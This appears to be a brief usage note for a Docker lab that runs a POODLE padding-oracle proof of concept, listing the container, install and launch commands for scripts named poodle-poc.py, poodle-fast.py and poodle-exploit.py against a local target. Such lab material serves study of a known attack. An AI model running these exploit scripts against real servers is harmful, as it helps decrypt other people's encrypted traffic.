# Start python instance
docker-compose run --rm poodle
docker-compose run --rm poodle bash

# Launch the attack
python3 poodle-poc.py
python3 poodle-fast.py


# Or 
docker-compose run poodle2 sh
apk add gcc musl-dev
cd /poodle
pip install -r requirements.txt

# Launch the attack
python3 poodle-poc.py


# Use poodle-exploit.py
python3 poodle-exploit.py 127.0.0.1 4443 web-server 443 --start-block 46 --stop-block 50